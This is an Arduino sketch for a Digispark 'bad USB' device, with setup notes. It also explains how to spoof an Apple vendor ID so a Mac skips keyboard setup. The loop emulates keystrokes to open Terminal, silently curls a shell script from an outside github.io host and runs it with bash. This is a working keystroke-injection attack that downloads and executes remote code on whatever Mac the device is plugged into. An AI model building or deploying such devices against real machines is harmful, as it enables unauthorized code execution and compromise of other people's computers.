#include <DigiKeyboard.h>
/**
 * This is an example of bad USB script for a digispark ATTINY85
 * 
 * To code your own digispark in an arduino IDE:
 *  1. Under File > Preferences > add http://digistump.com/package_digistump_index.json to board manager links
 *  2. Install digistump avr baords under  tools > boards > boards manager (search digistump)
 *  3. Select the defualt board under tools > board > digistump avr boards >  digispark (default)
 *  4. Select the programmer under Tools > Programmer > Micronuclues
 *  5. Select upload first, then plug in your digispark within 60 seconds of pressing upload (the arrow in the top left)
 * 
 * To get the digispark usb working automatically for mac without keyboard setup:
 *  1. sudo find / -type d -name "digistump" in your terminal # on linux, on mac lookup PATHUNITL=~/Library/Arduino15/packages
 *  2. Open /PATHUNITL/digistump/hardware/avr/1.6.7/libraries/DigisparkKeyboard/usbconfig.h
 *  3. Find the secction "--- Device Description ---"
 *  4. Replace the vendor id with an apple vendor id replace '0xNNN, 0xNNN' with "0xac, 0x05"
 *  
 * For mac reference https://null-byte.wonderhowto.com/how-to/hack-macos-with-digispark-ducky-script-payloads-0198555/
 * 
 * For CHAR codes reference https://github.com/digistump/DigistumpArduino/blob/master/digistump-avr/libraries/DigisparkKeyboard/DigiKeyboard.h
 *
 * This Keyboard Checker https://keyboardchecker.com/ might be helpful resource
 * 
 * MOD_ keys  or "modifiers" have to be passed as a second parameter. they can be 
 * combined with an OR
 *  For example "ctrl+alt+t": DigiKeyboard.sendKeyStroke(KEY_T, MOD_ALT_LEFT | MOD_CONTROL_LEFT)
 *  
 * For Resolving GCC error on MacOS Monterary: https://forum.arduino.cc/t/avr-g-bad-cpu-type-in-executable/595790/14
 *
 */
bool ran = false;

void setup() {
}

void loop() {
  if (!ran) {
    // Initialize DigiKeyboard
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(500);

    // Press Windows key, then open terminal
    DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT); 
    DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT); 
    DigiKeyboard.delay(500);
    DigiKeyboard.println("terminal");
    DigiKeyboard.delay(800);

    DigiKeyboard.println("curl --silent https://barakbinyamin.github.io/scriptedUSB/scripts/bash/example.sh --output example.sh");
    DigiKeyboard.println("bash example.sh");
    ran = true;
  }
}
